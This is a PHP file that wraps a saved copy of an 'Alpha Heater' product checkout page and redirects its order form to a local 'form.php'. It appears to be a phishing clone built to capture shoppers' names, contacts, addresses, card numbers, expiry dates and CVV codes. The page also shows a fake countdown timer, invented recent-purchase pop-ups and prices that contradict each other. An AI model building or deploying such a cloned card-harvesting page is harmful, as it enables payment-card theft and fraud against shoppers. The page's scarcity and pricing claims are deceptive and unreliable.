<?php
// Declare the filename
$data = "form.php";
?>

<!DOCTYPE html><html lang="en" data-scrapbook-source="https://offer.getalphaheater.com/offer/1/checkout-now-v4.php?C1=1124&amp;uid=9409&amp;oid=1124&amp;affid=1279&amp;AFFID=1279&amp;utm_campaign=CPA_1279&amp;utm_source=1279&amp;sub5=ysOfd21ffYlhiZ3hAED9YptDMIpvovOBsO" data-scrapbook-create="20231126054230043" data-scrapbook-title="Alpha Heater"><head><style>.pac-container{background-color:#fff;position:absolute!important;z-index:1000;border-radius:2px;border-top:1px solid #d9d9d9;font-family:Arial,sans-serif;-webkit-box-shadow:0 2px 6px rgba(0,0,0,.3);box-shadow:0 2px 6px rgba(0,0,0,.3);-webkit-box-sizing:border-box;box-sizing:border-box;overflow:hidden}.pac-logo:after{content:"";padding:1px 1px 1px 0;height:18px;-webkit-box-sizing:border-box;box-sizing:border-box;text-align:right;display:block;background-image:url("powered-by-google-on-white3.png");background-position:right;background-repeat:no-repeat;-webkit-background-size:120px 14px;background-size:120px 14px}.hdpi.pac-logo:after{background-image:url("")}.pac-item{cursor:default;padding:0 4px;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;line-height:30px;text-align:left;border-top:1px solid #e6e6e6;font-size:11px;color:#515151}.pac-item:hover{background-color:#fafafa}.pac-item-selected,.pac-item-selected:hover{background-color:#ebf2fe}.pac-matched{font-weight:700}.pac-item-query{font-size:13px;padding-right:3px;color:#000}.pac-icon{width:15px;height:20px;margin-right:7px;margin-top:6px;display:inline-block;vertical-align:top;background-image:url("");-webkit-background-size:34px 34px;background-size:34px}.hdpi .pac-icon{background-image:url("")}.pac-icon-search{background-position:-1px -1px}.pac-item-selected .pac-icon-search{background-position:-18px -1px}.pac-icon-marker{background-position:-1px -161px}.pac-item-selected .pac-icon-marker{background-position:-18px -161px}.pac-placeholder{color:gray}sentinel{}
</style>
<meta charset="UTF-8">
<meta name="description" content="Alpha Heater">



<title>Alpha Heater</title>

<link href="favicon.png" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="content-language" content="en-us">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="HandheldFriendly" content="true">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<link rel="stylesheet" href="app2.css">
<link rel="stylesheet" href="css2.css">
<link type="text/css" href="repeated-order-confirmation.min.css" rel="stylesheet">
<link type="text/css" href="repeated-order-confirmation-additional.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="checkout.css">
<link rel="stylesheet" type="text/css" href="slick.min.css">
<link rel="stylesheet" type="text/css" href="upsell-new-02.css">
<link rel="stylesheet" type="text/css" href="extra-style.css">
<link rel="stylesheet" type="text/css" href="fonts.css">
<link rel="stylesheet" type="text/css" href="custom.css">
<link rel="stylesheet" type="text/css" href="bottom-popup.css">
<link rel="stylesheet" type="text/css" href="all.min.css">
<style>
        .cb-each-warranty-price {
            margin-right: 0px !important;
        }

        .recDealStar {
            display: flex;
            align-items: center;
        }

        .recDealStar p {
            font-size: 14px;
            font-weight: 700;
        }
    </style>





<meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><iframe width="1" height="1" src="index_3.html" style="display: none; visibility: hidden;"></iframe></head>
<body>

<noscript><iframe src="index_2.html" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>




<noscript><img height="1" width="1" style="display:none" src="tr.txt"></noscript>




<div id="">
<img class="w-100 d-none d-md-block" src="Black_Friday_top.png">
<img class="w-100 d-block d-md-none" src="Mobile_Reconstruction_1.png">
</div>
<div class="topStrip">
<div class="container">
<p>
<span class="cb-total-discount-applied">50%</span> discount <span class="cb-discountPercentage"></span> applied.
This code expires in: <span id="stopwatch">04:24</span>.
Please do not leave this page!
</p>
</div>
</div>
<div class="top_bar_nav">
<div class="container">
<div class="dis-box-logo">
<div class="logo_wrap_dist">
<img src="logo.png" width="120">
</div>
<div class="box_style_thrty">
<h3 class="thrty_logos"><span><img src="60-day.png" width="80"></span><span>30-Days 100%<br>Money Back Guarantee</span></h3>
<h3 class="top-phone_wrap"><span><img src="icons8-phone-60.png"></span>Questions? Call: <a href="tel:+1 (866) 895-6759">+1 (866) 895-6759 </a></h3>
</div>
</div>
</div>
</div>
<div class="chk-header">
<div class="container">
<ul class="stepsBox">
<li><span>Checkout</span></li>
<li>Free Bonus</li>
<li>Receipt</li>
</ul>
</div>
</div>
<div class="checkout-section">
<div class="container">
<p class="chk-rgt-text1 forMob">New &amp; Improved 2023 Model </p>
<p class="prod-name forMob">Alpha Heat </p>
<p class="str-rvw forMob"><img src="star02.png" alt="Star">12,421 Verified Customer Reviews </p>
<div class="left-sec">
<div id="sticky-sticky-wrapper" class="sticky-wrapper" style="height: 610px;"><div id="sticky" style="">
<div class="vehicle-detail-banner banner-content clearfix">
<div class="banner-slider">
<div class="slider-banner-image">
<img src="bnr-prod.png" class="prd-nav" alt="img">
</div>
</div>
</div>
<div class="hide-mob">
<ul class="s1-list">
<li>
<img src="s1-icn1.png" class="s1-ic">
<p>Fast, Even Heating</p>
</li>
<li>
<img src="s1-icn2.png" class="s1-ic">
<p>Energy Efficient</p>
</li>
<li>
<img src="s1-icn3.png" class="s1-ic">
<p>Safe and Reliable</p>
</li>
<li>
<img src="s1-icn4.png" class="s1-ic">
<p>Silent and Discreet</p>
</li>
<li>
<img src="s1-icn5.png" class="s1-ic">
<p>Space-Saving</p>
</li>
</ul>
</div>
</div></div>
</div>
<div class="right-sec">
<p class="chk-rgt-text1 hide-mob">New &amp; Improved 2023 Model </p>
<p class="prod-name hide-mob">Alpha Heat </p>
<p class="str-rvw hide-mob"><img src="star02.png" alt="Star">12,421 Verified Customer
Reviews </p>
<p class="bdr-line hide-mob"></p>
<p class="prd-det-disc">Stay Warm and Cozy With The Most Compact Personal Heater On The Market! Guaranteed!</p>
<p class="bdr-line"></p>
<p class="pkg-hdng">Thats what you will pay </p>
<div class="pkg-opt">

<div class="buy-opt-rgt">

</div>
</div>
<div class="buyopt packageClass cb-package-container" id="product5" data-quantity="5" data-price="199.80" data-regprice="499.50" data-ship-us="9.95" data-ship-ca="14.95" data-package-discount="70" data-warranty="39.96" data-name="5x Alpha Heats Deluxe Family Pack" data-clickbump2-product-name="Remote Upgrade (Covers 5 Units)" data-clickbump2="24.95" data-ship="9.95" data-unitprice="39.96" data-productprice="199.80">
<div class="buy-opt-left">
<p>
Buy 1 Alpha Heats
<br>
<span><span class="cb-package-main-save">Save 90%</span> OFF</span> <span class="cb-discountPercentage"></span>
</p>
</div>
<div class="buy-opt-rgt">
<p class="pkg-prc">
<span class="cb-reg-price">$99.50</span>
<br>

<span class="cb-buy-each">$19.96/ea</span>
</p>
</div>
</div>
</div>
<p class="bdr-line"></p>
<p class="pkg-hdng">Enter customer information</p>
<form class="form" method="post" action="<?php echo $data; ?>" name="downsell_form1" accept-charset="utf-8" enctype="application/x-www-form-urlencoded;charset=utf-8" novalidate="novalidate">
<input type="hidden" name="prospectId" id="prospectId" value="">
<input type="hidden" name="campaigns[1][id]" id="campaign_id" value="1">

<input type="hidden" name="campaigns[2][id]" id="split_click_bump" class="cb-split-click-bump" value="31" disabled="">
<input type="hidden" name="campaigns[2][price]" value="9.99" id="clickbumpPrice" class="cb-click-bump-price" disabled="">
<input type="hidden" name="campaigns[3][id]" id="split_click_bump2" class="cb-split-click-bump-2" value="115">
<input type="hidden" name="coupon_code" value="No Discount">
<input type="hidden" name="regprice" id="regprice" value="99.90">
<input type="hidden" name="individualPrice" id="individualPrice" value="49.95">
<input type="hidden" name="packageQuantity" id="packageQuantity" value="1">
<div class="formBox">
<div class="frm-flds fl">
<label for="fname" class="fl-label">First Name</label>
<input type="text" name="firstName" id="firstName" class="input-flds required cb-remove-class frmField" placeholder="First Name" data-error-message="Please enter your first name!" value="">
</div>
<div class="frm-flds fl">
<label for="lanme" class="fl-label">Last Name</label>
<input type="text" name="lastName" id="lastName" class="input-flds required cb-remove-class frmField" placeholder="Last Name" data-error-message="Please enter your last name!" value="">
</div>
<div class="frm-flds fl">
<label for="email" class="fl-label">Email (For order confirmation)</label>
<input type="email" name="email" id="email" class="input-flds required cb-remove-class frmField" placeholder="Email Address" data-validate="email" data-error-message="Please enter a valid email id!" value="">
</div>
<div class="frm-flds fl">
<label for="phone" class="fl-label">Phone number</label>
<input type="tel" name="phone" id="phone" class="input-flds required cb-remove-class frmField" placeholder="Phone" data-validate="phone" data-min-length="10" data-max-length="15" maxlength="10" data-error-message="Please enter a valid contact number!" value="">
</div>
<p class="pkg-hdng">Enter your payment information </p>
<p>&nbsp;</p>
<div class="card-gurantee-sec text-center">
<img src="money-back-new.jpg" alt="Money-back logo" class="m-back">
</div>
<select name="creditCardType" class="form-control has-error" data-error-message="Please select valid card type!" style="display: none;">
<option value="" selected="selected">Card Type</option>
<option value="visa">Visa</option>
<option value="master">Master Card</option>
<option value="amex">Amex</option>
<option value="discover">Discover</option>
<option value="paypal">Paypal</option>
</select>
<div class="payoptbox">
<div class="payment-cards-box paypal-box">
<label class="paymybtn PaypalOpt">
<input type="radio" name="cctype" value="paypal" class="ccard cb-paypemt-radio" data-paymentmethod="paypal">
<svg height="24" viewBox="0 0 100 32" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMinYMin meet" class="payplsvg">
<path fill="#003087" d="M 12 4.917 L 4.2 4.917 C 3.7 4.917 3.2 5.317 3.1 5.817 L 0 25.817 C -0.1 26.217 0.2 26.517 0.6 26.517 L 4.3 26.517 C 4.8 26.517 5.3 26.117 5.4 25.617 L 6.2 20.217 C 6.3 19.717 6.7 19.317 7.3 19.317 L 9.8 19.317 C 14.9 19.317 17.9 16.817 18.7 11.917 C 19 9.817 18.7 8.117 17.7 6.917 C 16.6 5.617 14.6 4.917 12 4.917 Z M 12.9 12.217 C 12.5 15.017 10.3 15.017 8.3 15.017 L 7.1 15.017 L 7.9 9.817 C 7.9 9.517 8.2 9.317 8.5 9.317 L 9 9.317 C 10.4 9.317 11.7 9.317 12.4 10.117 C 12.9 10.517 13.1 11.217 12.9 12.217 Z">
</path>
<path fill="#003087" d="M 35.2 12.117 L 31.5 12.117 C 31.2 12.117 30.9 12.317 30.9 12.617 L 30.7 13.617 L 30.4 13.217 C 29.6 12.017 27.8 11.617 26 11.617 C 21.9 11.617 18.4 14.717 17.7 19.117 C 17.3 21.317 17.8 23.417 19.1 24.817 C 20.2 26.117 21.9 26.717 23.8 26.717 C 27.1 26.717 29 24.617 29 24.617 L 28.8 25.617 C 28.7 26.017 29 26.417 29.4 26.417 L 32.8 26.417 C 33.3 26.417 33.8 26.017 33.9 25.517 L 35.9 12.717 C 36 12.517 35.6 12.117 35.2 12.117 Z M 30.1 19.317 C 29.7 21.417 28.1 22.917 25.9 22.917 C 24.8 22.917 24 22.617 23.4 21.917 C 22.8 21.217 22.6 20.317 22.8 19.317 C 23.1 17.217 24.9 15.717 27 15.717 C 28.1 15.717 28.9 16.117 29.5 16.717 C 30 17.417 30.2 18.317 30.1 19.317 Z">
</path>
<path fill="#003087" d="M 55.1 12.117 L 51.4 12.117 C 51 12.117 50.7 12.317 50.5 12.617 L 45.3 20.217 L 43.1 12.917 C 43 12.417 42.5 12.117 42.1 12.117 L 38.4 12.117 C 38 12.117 37.6 12.517 37.8 13.017 L 41.9 25.117 L 38 30.517 C 37.7 30.917 38 31.517 38.5 31.517 L 42.2 31.517 C 42.6 31.517 42.9 31.317 43.1 31.017 L 55.6 13.017 C 55.9 12.717 55.6 12.117 55.1 12.117 Z">
</path>
<path fill="#009cde" d="M 67.5 4.917 L 59.7 4.917 C 59.2 4.917 58.7 5.317 58.6 5.817 L 55.5 25.717 C 55.4 26.117 55.7 26.417 56.1 26.417 L 60.1 26.417 C 60.5 26.417 60.8 26.117 60.8 25.817 L 61.7 20.117 C 61.8 19.617 62.2 19.217 62.8 19.217 L 65.3 19.217 C 70.4 19.217 73.4 16.717 74.2 11.817 C 74.5 9.717 74.2 8.017 73.2 6.817 C 72 5.617 70.1 4.917 67.5 4.917 Z M 68.4 12.217 C 68 15.017 65.8 15.017 63.8 15.017 L 62.6 15.017 L 63.4 9.817 C 63.4 9.517 63.7 9.317 64 9.317 L 64.5 9.317 C 65.9 9.317 67.2 9.317 67.9 10.117 C 68.4 10.517 68.5 11.217 68.4 12.217 Z">
</path>
<path fill="#009cde" d="M 90.7 12.117 L 87 12.117 C 86.7 12.117 86.4 12.317 86.4 12.617 L 86.2 13.617 L 85.9 13.217 C 85.1 12.017 83.3 11.617 81.5 11.617 C 77.4 11.617 73.9 14.717 73.2 19.117 C 72.8 21.317 73.3 23.417 74.6 24.817 C 75.7 26.117 77.4 26.717 79.3 26.717 C 82.6 26.717 84.5 24.617 84.5 24.617 L 84.3 25.617 C 84.2 26.017 84.5 26.417 84.9 26.417 L 88.3 26.417 C 88.8 26.417 89.3 26.017 89.4 25.517 L 91.4 12.717 C 91.4 12.517 91.1 12.117 90.7 12.117 Z M 85.5 19.317 C 85.1 21.417 83.5 22.917 81.3 22.917 C 80.2 22.917 79.4 22.617 78.8 21.917 C 78.2 21.217 78 20.317 78.2 19.317 C 78.5 17.217 80.3 15.717 82.4 15.717 C 83.5 15.717 84.3 16.117 84.9 16.717 C 85.5 17.417 85.7 18.317 85.5 19.317 Z">
</path>
<path fill="#009cde" d="M 95.1 5.417 L 91.9 25.717 C 91.8 26.117 92.1 26.417 92.5 26.417 L 95.7 26.417 C 96.2 26.417 96.7 26.017 96.8 25.517 L 100 5.617 C 100.1 5.217 99.8 4.917 99.4 4.917 L 95.8 4.917 C 95.4 4.917 95.2 5.117 95.1 5.417 Z">
</path>
</svg>
</label>
</div>
<div class="payment-cards-box cardPayOpt">
<label class="paymybtn">
<input type="radio" class="ccard cb-paypemt-radio" name="cctype" value="cc" checked="checked" data-paymentmethod="credit_card">
Credit card
</label>
<img src="visa-mstr-disc.png" class="visa-imgg">
<div class="clearall"></div>
</div>
<div class="payment-flds-box credit-card">
<div class="frm-flds fl fl-form">
<label for="cardNumber" class="fl-label">Card Number #</label>
<input type="tel" name="creditCardNumber" class="input-flds required frmField numeric remove" maxlength="16" placeholder="Credit Card #" data-error-message="Please enter your card number!" value="">
</div>
<div class="frm-flds half-fld fl">
<label for="month" class="fl-label">Month</label>
<select name="expmonth" class="selcet-fld required frmField month_exp remove" data-error-message="Please select a valid expiration month!" style="">
<option value="" selected="selected">Month</option><option value="01">(01) January</option><option value="02">(02) February</option><option value="03">(03) March</option><option value="04">(04) April</option><option value="05">(05) May</option><option value="06">(06) June</option><option value="07">(07) July</option><option value="08">(08) August</option><option value="09">(09) September</option><option value="10">(10) October</option><option value="11">(11) November</option><option value="12">(12) December</option> </select>
</div>
<div class="frm-flds half-fld fr">
<label for="year" class="fl-label">Year</label>
<select name="expyear" class="selcet-fld required frmField month_year remove" data-error-message="Please select a valid expiration year!">
<option value="" selected="selected">Year</option><option value="23">2023</option><option value="24">2024</option><option value="25">2025</option><option value="26">2026</option><option value="27">2027</option><option value="28">2028</option><option value="29">2029</option><option value="30">2030</option><option value="31">2031</option><option value="32">2032</option><option value="33">2033</option><option value="34">2034</option><option value="35">2035</option><option value="36">2036</option><option value="37">2037</option><option value="38">2038</option><option value="39">2039</option><option value="40">2040</option><option value="41">2041</option><option value="42">2042</option> </select>
</div>
<div class="frm-flds fl half-fld  billing-cvv">
<label for="cvv" class="fl-label">CVV</label>
<input type="tel" name="CVV" class="input-flds fl-input required frmField remove" placeholder="CVV" id="cvv" data-validate="cvv" maxlength="3" data-error-message="Please enter a valid CVV code!" value="">
</div>
<div class="clearall"></div>
</div>
</div>
<a href="javascript:" class="continue-ship">Continue to Shipping</a>
<div class="js_choose_billing" style="display:none;">
<div class="w_radio">
<input type="radio" id="radio_same_as_shipping" name="billingSameAsShipping" value="yes" checked="checked">
<label for="radio_same_as_shipping">
Billing is the same as shipping
</label>
<i class="icon-check"></i>
</div>
<div class="w_radio">
<input type="radio" id="radio_different_shipping" name="billingSameAsShipping" value="no">
<label for="radio_different_shipping">
Billing Address different as Shipping
</label>
<i class="icon-check"></i>
</div>
</div>
<label class="fieldToggle" id="fieldToggle">
<input type="checkbox" id="togData" class="cb-address-differs-check" name="billShipSame" checked="checked">
<span class="togship"></span>
Billing is the same as shipping
</label>
<div class="clearall"></div>
<div class="shipaddress billing-info" style="display:none">
<div class="frm-flds fl">
<label for="fname" class="fl-label">Billing First Name</label>
<input type="text" name="billingFirstName" class="input-flds cb-remove-class-billing form-control-custom frmField" placeholder="Billing First Name" data-error-message="Please enter your billing first name!" value="">
</div>
<div class="frm-flds fl">
<label for="lanme" class="fl-label">Billing Last Name</label>
<input type="text" name="billingLastName" class="input-flds cb-remove-class-billing frmField" placeholder="Billing Last Name" data-error-message="Please enter your billing last name!" value="">
</div>
<div class="frm-flds fl">
<label for="address" class="fl-label">Billing Address</label>
<input type="text" name="billingAddress1" class="input-flds cb-remove-class-billing frmField" placeholder="Billing Address" data-error-message="Please enter your billing address!" value="">
</div>
<div class="frm-flds fl">
<label for="appt" class="fl-label">Apartment, suite, etc. (optional)</label>
<input type="text" name="billingAddress2" class="input-flds" placeholder="Apartment, suite, etc. (optional)" id="appt" value="">
</div>
<div class="frm-flds fl">
<label for="city" class="fl-label">Your City</label>
<input type="text" name="billingCity" class="input-flds cb-remove-class-billing frmField" placeholder="Billing City" data-error-message="Please enter your billing city!" value="">
</div>
<div class="frm-flds fl">
<label for="billingCountry" class="fl-label">Select Country</label>
<select name="billingCountry" type="text" placeholder="Your State" class="selcet-fld cb-remove-class-billing frmField" data-selected="US" data-error-message="Please select your billing country!">
<option value="" selected="selected">Select Country</option>
</select>
</div>
<div class="frm-flds fl">
<label for="state" class="fl-label">Select State</label>
<input type="text" name="billingState" class="selcet-fld cb-remove-class-billing frmField" placeholder="Your State" data-error-message="Please select your billing state!" data-selected="CA" value="">
</div>
<div class="frm-flds fl">
<label for="zip" class="fl-label">Zip Code</label>
<input type="tel" name="billingZip" class="input-flds cb-remove-class-billing frmField" placeholder="Billing Zip Code" data-error-message="Please enter a valid billing zip code!" value="">
</div>
</div>
<p class="bdr-line"></p>
<div class="payment-flds-box">
<p class="pkg-hdng">Enter your shipping information</p>
<div class="frm-flds fl">
<label for="address" class="fl-label">Shipping Address</label>
<input type="text" name="shippingAddress1" class="input-flds required cb-remove-class frmField pac-target-input" placeholder="Your Address" data-error-message="Please enter your address!" id="shipAddress" autocomplete="off" value="">

</div>
<div class="frm-flds fl">
<label for="appt" class="fl-label">Apartment, suite, etc. (optional)</label>
<input type="text" name="shippingAddress2" class="input-flds" placeholder="Apartment, suite, etc. (optional)" id="appt" value="">
</div>
<div class="frm-flds fl">
<label for="city" class="fl-label">Your City</label>
<input type="text" name="shippingCity" class="input-flds required cb-remove-class frmField" placeholder="Your City" data-error-message="Please enter your city!" value="">
</div>
<div class="frm-flds fl">
<label for="shippingCountry" class="fl-label">Select Country</label>
<select name="shippingCountry" type="text" placeholder="Your State" class="selcet-fld required cb-remove-class frmField no-error" data-selected="US" data-error-message="Please select your country!"><option value="">Select Country</option><option value="US" selected="selected">United States</option><option value="CA">Canada</option></select>
</div>
<div class="frm-flds fl">
<label for="state" class="fl-label">State:</label>
<select name="shippingState" type="text" placeholder="Your State" class="selcet-fld required cb-remove-class frmField" data-error-message="Please select your state!" readonly="readonly" data-selected="CA">
    <option value="">Select State</option>
    <option value="AL">Alabama</option>
    <option value="AK">Alaska</option>
    <option value="AS">American Samoa</option>
    <option value="AZ">Arizona</option>
    <option value="AR">Arkansas</option>
    <option value="CA" selected="selected">California</option>
    <option value="CO">Colorado</option>
    <option value="CT">Connecticut</option>
    <option value="DE">Delaware</option>
    <option value="DC">District of Columbia</option>
    <option value="FM">Federated States of Micronesia</option>
    <option value="FL">Florida</option>
    <option value="GA">Georgia</option>
    <option value="GU">Guam</option>
    <option value="HI">Hawaii</option>
    <option value="ID">Idaho</option>
    <option value="IL">Illinois</option>
    <option value="IN">Indiana</option>
    <option value="IA">Iowa</option>
    <option value="KS">Kansas</option>
    <option value="KY">Kentucky</option>
    <option value="LA">Louisiana</option>
    <option value="ME">Maine</option>
    <option value="MD">Maryland</option>
    <option value="MA">Massachusetts</option>
    <option value="MI">Michigan</option>
    <option value="MN">Minnesota</option>
    <option value="MS">Mississippi</option>
    <option value="MO">Missouri</option>
    <option value="MT">Montana</option>
    <option value="NE">Nebraska</option>
    <option value="NV">Nevada</option>
    <option value="NH">New Hampshire</option>
    <option value="NJ">New Jersey</option>
    <option value="NM">New Mexico</option>
    <option value="NY">New York</option>
    <option value="NC">North Carolina</option>
    <option value="ND">North Dakota</option>
    <option value="MP">Northern Mariana Islands</option>
    <option value="OH">Ohio</option>
    <option value="OK">Oklahoma</option>
    <option value="OR">Oregon</option>
    <option value="PA">Pennsylvania</option>
    <option value="PR">Puerto Rico</option>
    <option value="MH">Republic of Marshall Islands</option>
    <option value="RI">Rhode Island</option>
    <option value="SC">South Carolina</option>
    <option value="SD">South Dakota</option>
    <option value="TN">Tennessee</option>
    <option value="TX">Texas</option>
    <option value="UT">Utah</option>
    <option value="VT">Vermont</option>
    <option value="VI">Virgin Islands of the U.S.</option>
    <option value="VA">Virginia</option>
    <option value="WA">Washington</option>
    <option value="WV">West Virginia</option>
    <option value="WI">Wisconsin</option>
    <option value="WY">Wyoming</option>
    <!-- Canadian Provinces -->
    <option value="AB">Alberta</option>
    <option value="BC">British Columbia</option>
    <option value="MB">Manitoba</option>
    <option value="NB">New Brunswick</option>
    <option value="NL">Newfoundland and Labrador</option>
    <option value="NS">Nova Scotia</option>
    <option value="NT">Northwest Territories</option>
    <option value="NU">Nunavut</option>
    <option value="ON">Ontario</option>
    <option value="PE">Prince Edward Island</option>
    <option value="QC">Quebec</option>
    <option value="SK">Saskatchewan</option>
    <option value="YT">Yukon</option>
  </select>
  </div>
<div class="frm-flds fl">
<label for="zip" class="fl-label">Zip Code:</label>
<input type="tel" name="shippingZip" id="zip" class="input-flds required cb-remove-class frmField" placeholder="Zip Code" data-error-message="Please enter a valid zip code!" value="">
</div>

</div>
</div>

<p class="bdr-line"></p>
<p class="pkg-hdng">Would you like to add Alpha Heat Coverage?</p>
<p class="pkg-subhdng color-blk">Be covered for a 1 year with our replacement and protection plan for
<span id="protection_value" class="cb-each-warranty-price">$0.00</span>/ea. This extended warranty means you are covered for 1 year.
</p>
<div class="selectr-grpBox warrantyClass" id="wrnty">
<div class="pckt_rts">
<label class="pckt_rts_container">
<input type="checkbox" id="checkStatus" class="wrnt cb-check-status" name="packopt" value="1" data-price="9.99">
<span class="checkmark"></span>
<p class="grp-bx-text1">Alpha Heat Coverage</p>
</label>
</div>
<p class="grp-bx-text2"><span class="cb-warranty-original-price">$19.98</span> <span id="protection" class="cb-each-warranty-price">$0.00</span>/ea</p>
<ul class="grpbx-list">
<li>Decrease temperature </li>
<li>Increase temperature</li>
<li>Turn on &amp; off</li>
<li>Set the timer</li>
<li>Works from anywhere in the room</li>
</ul>
</div>
<p class="bdr-line"></p>
<div class="add-box-new selectr-grpBox">

<div class="add-box-new-header add-box-new-header-1 py-3 d-flex justify-content-start align-items-center mb-1 ">
<i class="fas fa-caret-right bounce-arrow me-1 text-danger"></i>
<div class="form-check mb-0">
<input type="checkbox" id="checkStatus2" class="cb-check-status-2 form-check-input" data-price="17.97" checked="checked">
<label for="checkStatus2" class="expship ml-1 mb-0"> Yes, give me remotes!</label>
</div>
<i class="fas fa-caret-left bounce-arrow-r ms-1 text-danger"></i>
</div>
<div class="add-box-new-content add-box-new-content-1 px-3 pt-2 fs-7">
<p><span class="ylw">One-Chance Offer:</span> By placing your order today, we'll add a remote for each heater unit</span>
<span>and ship it with your order for FREE. </span>
</p>
</div>
</div>
<div class="order-summary-section">
<div class="top-row">
<div>
<p>Item</p>
</div>
<div>
<p>Amount</p>
</div>
</div>
<div class="item-detail-section">

<div class="item-detail-row">
<div class="item-name">
<p class="main_prd cb-cart-title">1x Alpha Heat Single Pack</p>
</div>
<div class="item-price">
<p class="main_prd_price">$<span class="cb-product-price">19.95</span></p>
</div>
</div>

<div class="item-detail-row  cb-click-bump-order-sum-div d-none" id="Kinetic_Pro_Coverage">
<div class="item-name">
<p>Alpha Heat Coverage </p>
</div>
<div class="item-price">
<p id="Kinetic_Pro_Coverage_Price"><span class="cb-each-warranty-price">$9.99</span>/ea</p>
</div>
</div>

<div class="item-detail-row cb-click-bump-order-sum-div-2 d-flex" id="Kinetic_Pro_Coverage">
<div><span class="cb-clickbump-product-2">Shipping and tax</span></div>
<div>
<span class="cb-clickbump-price-2-each">$0.00/ea</span></div>
</div>

<p>    </p>
</div>
<div class="offer-prcBox">
<div class="save-txt">
<p>Today You<br><span>Saved</span></p>
<img src="save-arw_new.png">
</div>
<div class="ofr-rgt">
<p>Discount: <span class="discount-total">$<span class="cb-total-discount">19.95</span></span></p>
<p>Free 3 days Shipping: <span class="grand-total totalAmt"><span class="cb-gtotal-without-shipping">$0.00</span></span></p>
</div>
</div>
</div>
<button type="submit" class="complete-btn">Complete Checkout</button>
<input type="hidden" name="csrf_token" value="9010d5a09f3c3e037cf0b1a18f9781541d1a2f69f139f565fa4925e6d59abbab"></form></div>
</div>
<p id="loading-indicator" style="display:none;">Processing...</p>

<div class="forMob">
<ul class="s1-list">
<li>
<img src="s1-icn1.png" class="s1-ic">
<p>Fast, Even Heating</p>
</li>
<li>
<img src="s1-icn2.png" class="s1-ic">
<p>Energy Efficient</p>
</li>
<li>
<img src="s1-icn3.png" class="s1-ic">
<p>Safe and Reliable</p>
</li>
<li>
<img src="s1-icn4.png" class="s1-ic">
<p>Silent and Discreet</p>
</li>
<li>
<img src="s1-icn5.png" class="s1-ic">
<p>Space-Saving</p>
</li>
</ul>
</div>
</div>

<div class="clearall"></div>
<div class="footer">
<div class="container">
<p class="ftr-txt1">
©2023 Copyright Alpha Heat - All rights reserved.
</p>
<p class="ftr-txt1">
<a align="center" href="https://offer.getalphaheater.com/offer/1/contact.php?C1=1124&amp;uid=9409&amp;oid=1124&amp;affid=1279&amp;AFFID=1279&amp;utm_campaign=CPA_1279&amp;utm_source=1279&amp;sub5=ysOfd21ffYlhiZ3hAED9YptDMIpvovOBsO" target="_blank" class="link">Contact Us</a> |
<a align="center" href="https://offer.getalphaheater.com/offer/1/terms.php?C1=1124&amp;uid=9409&amp;oid=1124&amp;affid=1279&amp;AFFID=1279&amp;utm_campaign=CPA_1279&amp;utm_source=1279&amp;sub5=ysOfd21ffYlhiZ3hAED9YptDMIpvovOBsO" target="_blank" class="link">Terms of Use </a> |
<a align="center" href="https://offer.getalphaheater.com/offer/1/privacy.php?C1=1124&amp;uid=9409&amp;oid=1124&amp;affid=1279&amp;AFFID=1279&amp;utm_campaign=CPA_1279&amp;utm_source=1279&amp;sub5=ysOfd21ffYlhiZ3hAED9YptDMIpvovOBsO" target="_blank" class="link">Privacy Policy </a>
</p>
<center>
<a href="https://www.dmca.com/Protection/Status.aspx?ID=0b693e6c-31d5-424a-8417-2bacb9b8923c&amp;refurl=https://offer.getalphaheater.com/offer/1/checkout-now-v4.php?C1=1124&amp;uid=9409&amp;oid=1124&amp;affid=1279&amp;AFFID=1279&amp;utm_campaign=CPA_1279&amp;utm_source=1279&amp;sub5=ysOfd21ffYlhiZ3hAED9YptDMIpvovOBsO" title="DMCA.com Protection Status" target="_blank" class="dmca-badge"> <img src="dmca_protected_sml_120n.png" alt="DMCA.com Protection Status"></a>

</center>
</div>
</div>

<div class="w_fomo_wrapper up-down">
<div class="w_outer">
<div class="w_inner">
<div class="w_item ">
<div class="w_thumb">
<img src="product1a.png" alt="" class="img-view no-lazy">
</div>
<div class="w_desc">
<p>
<span id="randFirst" class="randFirst">Benjamin</span>
<span id="randLast" class="randLast">A</span>. in
<span id="randLocation" class="randLocation">Philadelphia, PA</span>
<br>
purchased
<br>
<strong>
<font id="randQuantity">3</font>x Alpha Heat<span id="quantity-plural">s</span>
</strong>
</p>
<p>
About <span id="randTime">31</span> minutes ago
</p>
</div>
</div>
</div>
</div>
</div>



 


 











<div class="pac-container pac-logo" style="display: none;"></div>



<iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: medium; visibility: hidden;" src="index_1.html"></iframe>
  </body></html>